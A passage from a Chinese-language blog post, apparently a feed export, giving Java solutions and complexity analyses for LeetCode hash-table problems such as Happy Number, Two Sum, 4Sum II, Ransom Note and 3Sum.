index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="第202题-快乐数"><a href="#第202题-快乐数" class="headerlink" title="第202题. 快乐数"></a>第202题. 快乐数</h2><p>编写一个算法来判断一个数 n 是不是快乐数。</p><p>「快乐数」 定义为：</p><p>对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。<br>然后重复这个过程直到这个数变为 1，也可能是 无限循环 但始终变不到 1。<br>如果这个过程 结果为 1，那么这个数就是快乐数。<br>如果 n 是 快乐数 就返回 true ；不是，则返回 false 。</p><p>示例 1：</p><blockquote><p>输入：n &#x3D; 19<br>输出：true<br>解释：<br>12 + 92 &#x3D; 82<br>82 + 22 &#x3D; 68<br>62 + 82 &#x3D; 100<br>12 + 02 + 02 &#x3D; 1<br>示例 2：<br>输入：n &#x3D; 2<br>输出：false</p></blockquote><p>这道题我感觉主要涉及两个知识点：</p><ol><li>可以通过对10取余数来获取每个位置的数值</li><li>题目中提到了无限循环，其实我们可以发现如果在重复的过程中出现了之前的数，那么就会有无限循环，所以可以用一个set来判断<br>题解如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        Set&lt;Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (n!= <span class="number">1</span> &amp;&amp; !record.contains(n))&#123;</span><br><span class="line">            record.add(n);</span><br><span class="line">            n = getNextNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNextNumber</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            res += temp * temp;</span><br><span class="line">            n = n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>确定这个问题的时间复杂度对于一个「简单」级别的问题来说是一个挑战。如果您对这些问题还不熟悉，可以尝试只计算 getNext(n) 函数的时间复杂度。</li></ol><p>时间复杂度：O(243⋅3+logn+loglogn+logloglogn)… &#x3D; O(logn)。</p><ul><li>查找给定数字的下一个值的成本为 O(logn)，因为我们正在处理数字中的每位数字，而数字中的位数由 logn 给定。</li><li>要计算出总的时间复杂度，我们需要仔细考虑循环中有多少个数字，它们有多大。</li><li>我们在上面确定，一旦一个数字低于 243，它就不可能回到 243 以上。因此，我们就可以用 243 以下最长循环的长度来代替 243，不过，因为常数无论如何都无关紧要，所以我们不会担心它。</li><li>对于高于 243 的 n，我们需要考虑循环中每个数高于 243 的成本。通过数学运算，我们可以证明在最坏的情况下，这些成本将是 O(logn)+O(loglogn)+O(logloglogn)…。幸运的是，O(logn) 是占主导地位的部分，而其他部分相比之下都很小（总的来说，它们的总和小于logn），所以我们可以忽略它们。<br>空间复杂度：O(logn)。与时间复杂度密切相关的是衡量我们放入哈希集合中的数字以及它们有多大的指标。对于足够大的 n，大部分空间将由 n 本身占用。我们可以很容易地优化到 O(243⋅3)&#x3D;O(1)，方法是只保存集合中小于 243 的数字，因为对于较高的数字，无论如何都不可能返回到它们。</li></ul><p>力扣上给出了更好的解法：<br>使用 “快慢指针” 思想，找出循环：“快指针” 每次走两步，“慢指针” 每次走一步，当二者相等时，即为一个循环周期。此时，判断是不是因为 1 引起的循环，是的话就是快乐数，否则不是快乐数。<br>注意：此题不建议用集合记录每次的计算结果来判断是否进入循环，因为这个集合可能大到无法存储；另外，也不建议使用递归，同理，如果递归层次较深，会直接导致调用栈崩溃。不要因为这个题目给出的整数是 int 型而投机取巧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">bitSquareSum</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bit</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">            sum += bit * bit;</span><br><span class="line">            n = n / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> n, fast = n;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            slow = bitSquareSum(slow);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">            fast = bitSquareSum(fast);</span><br><span class="line">        &#125; <span class="keyword">while</span> (slow != fast);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> slow == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度：O(logn)。该分析建立在对前一种方法的分析的基础上，但是这次我们需要跟踪两个指针而不是一个指针来分析，以及在它们相遇前需要绕着这个循环走多少次。</p><ul><li>如果没有循环，那么快跑者将先到达 1，慢跑者将到达链表中的一半。我们知道最坏的情况下，成本是 O(2⋅logn)&#x3D;O(logn)。</li><li>一旦两个指针都在循环中，在每个循环中，快跑者将离慢跑者更近一步。一旦快跑者落后慢跑者一步，他们就会在下一步相遇。假设循环中有 k 个数字。如果他们的起点是相隔 k−1 的位置（这是他们可以开始的最远的距离），那么快跑者需要 k−1 步才能到达慢跑者，这对于我们的目的来说也是不变的。因此，主操作仍然在计算起始 n 的下一个值，即 O(logn)。<br>空间复杂度：O(1)，对于这种方法，我们不需要哈希集来检测循环。指针需要常数的额外空间。</li></ul><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a>1. 两数之和</h2><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。<br>你可以假设每种输入只会对应一个答案，并且你不能使用两次相同的元素。<br>你可以按任意顺序返回答案。</p><p>示例 1：</p><blockquote><p>输入：nums &#x3D; [2,7,11,15], target &#x3D; 9<br>输出：[0,1]<br>解释：因为 nums[0] + nums[1] &#x3D;&#x3D; 9 ，返回 [0, 1] 。</p></blockquote><p>示例 2：</p><blockquote><p>输入：nums &#x3D; [3,2,4], target &#x3D; 6<br>输出：[1,2]</p></blockquote><p>示例 3：</p><blockquote><p>输入：nums &#x3D; [3,3], target &#x3D; 6<br>输出：[0,1]</p></blockquote><p>重点是可以一边遍历,一边对比map中是否有想要的结构,这样就只需要一遍遍历就好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(temp);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; indexMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">balance</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(indexMap.containsKey(balance))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;i, indexMap.get(balance)&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                indexMap.put(nums[i], i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以用双指针解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span> m=<span class="number">0</span>, n=<span class="number">0</span>, k, board=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span>[] tmp1 = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        <span class="comment">// 备份原来下标的数组</span></span><br><span class="line">        System.arraycopy(nums, <span class="number">0</span>, tmp1, <span class="number">0</span>, nums.length);</span><br><span class="line">        <span class="comment">// 将nums排序</span></span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 双指针</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, j = nums.length-<span class="number">1</span>; i&lt;j;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] &lt; target)</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] &gt; target)</span><br><span class="line">            j--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">            m=i;</span><br><span class="line">            n=j;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到在temp1中的下标</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;nums.length;k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[k] == nums[m])&#123;</span><br><span class="line">                res[<span class="number">0</span>] = k;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp1[i] == nums[n] &amp;&amp; i != k)&#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第454题-四数相加II"><a href="#第454题-四数相加II" class="headerlink" title="第454题.四数相加II"></a>第454题.四数相加II</h2><p>给你四个整数数组 nums1、nums2、nums3 和 nums4 ，数组长度都是 n ，请你计算有多少个元组 (i, j, k, l) 能满足：<br>0 &lt;&#x3D; i, j, k, l &lt; n<br>nums1[i] + nums2[j] + nums3[k] + nums4[l] &#x3D;&#x3D; 0</p><p>示例 1：</p><blockquote><p>输入：nums1 &#x3D; [1,2], nums2 &#x3D; [-2,-1], nums3 &#x3D; [-1,2], nums4 &#x3D; [0,2]<br>输出：2<br>解释：<br>两个元组如下：</p><ol><li>(0, 0, 0, 1) -&gt; nums1[0] + nums2[0] + nums3[0] + nums4[1] &#x3D; 1 + (-2) + (-1) + 2 &#x3D; 0</li><li>(1, 1, 0, 0) -&gt; nums1[1] + nums2[1] + nums3[0] + nums4[0] &#x3D; 2 + (-1) + (-1) + 0 &#x3D; 0</li></ol></blockquote><p>示例 2：</p><blockquote><p>输入：nums1 &#x3D; [0], nums2 &#x3D; [0], nums3 &#x3D; [0], nums4 &#x3D; [0]<br>输出：1</p></blockquote><p>主要想法是把四个数组两两划分，计算和以及出现的次数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="comment">// 统计两个数组中的元素之和，同时统计出现的次数，放入map</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> i + j;</span><br><span class="line">                map.put(sum, map.getOrDefault(sum, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 统计剩余的两个元素的和，在map中是否存在相加为0的情况，同时统计次数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3)&#123;</span><br><span class="line">            <span class="keyword">for</span>( <span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                res += map.getOrDefault(<span class="number">0</span>-i-j, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复杂度分析<br>时间复杂度：O(n2)。我们使用了两次二重循环，时间复杂度均为 O(n2)。在循环中对哈希映射进行的修改以及查询操作的期望时间复杂度均为 O(1)，因此总时间复杂度为 O(n2)。<br>空间复杂度：O(n2)，即为哈希映射需要使用的空间。在最坏的情况下，<code>A[i]+B[j]</code> 的值均不相同，因此值的个数为 n2，也就需要 O(n2) 的空间。</p><h2 id="383-赎金信"><a href="#383-赎金信" class="headerlink" title="383. 赎金信"></a>383. 赎金信</h2><p>给你两个字符串：ransomNote 和 magazine ，判断 ransomNote 能不能由 magazine 里面的字符构成。<br>如果可以，返回 true ；否则返回 false 。<br>magazine 中的每个字符只能在 ransomNote 中使用一次。</p><p>示例 1：<br>输入：ransomNote &#x3D; “a”, magazine &#x3D; “b”<br>输出：false</p><p>示例 2：<br>输入：ransomNote &#x3D; “aa”, magazine &#x3D; “ab”<br>输出：false</p><p>示例 3：<br>输入：ransomNote &#x3D; “aa”, magazine &#x3D; “aab”<br>输出：true</p><p>其实主要还是用哈希表记录有哪些，然后需要哪些，减去之后再检查哈希表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConstruct</span><span class="params">(String ransomNote, String magazine)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(ransomNote.length() &gt; magazine.length())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 定义一个哈希映射数组</span></span><br><span class="line">        <span class="type">int</span>[] record =  <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : magazine.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : ransomNote.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第15题-三数之和"><a href="#第15题-三数之和" class="headerlink" title="第15题. 三数之和"></a>第15题. 三数之和</h2><p>给你一个整数数组 nums ，判断是否存在三元组 <code>[nums[i], nums[j], nums[k]]</code> 满足 i !&#x3D; j、i !&#x3D; k 且 j !&#x3D; k ，同时还满足 <code>nums[i] + nums[j] + nums[k] == 0</code> 。请你返回所有和为 0 且不重复的三元组。<br>注意：答案中不可以包含重复的三元组。</p><p>拿这个nums数组来举例，首先将数组排序，然后有一层for循环，i从下标0的地方开始，同时定一个下标left 定义在i+1的位置上，定义下标right 在数组结尾的位置上。<br>依然还是在数组中找到 abc 使得a + b +c &#x3D;0，我们这里相当于 <code>a = nums[i]，b = nums[left]，c = nums[right]</code>。<br>接下来如何移动left 和right呢， 如果<code>nums[i] + nums[left] + nums[right] &gt; 0</code> 就说明 此时三数之和大了，因为数组是排序后了，所以right下标就应该向左移动，这样才能让三数之和小一些。<br>如果 <code>nums[i] + nums[left] + nums[right] &lt; 0</code> 说明 此时 三数之和小了，left 就向右移动，才能让三数之和大一些，直到left与right相遇为止。<br>时间复杂度：O(n^2)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用双指针法解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(right &gt; left)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line">                    <span class="comment">// 去重逻辑应该放在找到一个三元组之后对abc去重</span></span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[right] == nums[right-<span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                    right--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用哈希集合解决</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// 找出a + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">            HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;nums.length;j++)&#123;</span><br><span class="line">                <span class="comment">//三元组元素b去重</span></span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">2</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>] &amp;&amp; nums[j-<span class="number">1</span>] == nums[j-<span class="number">2</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> -nums[i] - nums[j];</span><br><span class="line">                <span class="keyword">if</span>(set.contains(c))&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[j], c));</span><br><span class="line">                    set.remove(c); <span class="comment">//三元组元素c去重</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    set.add(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
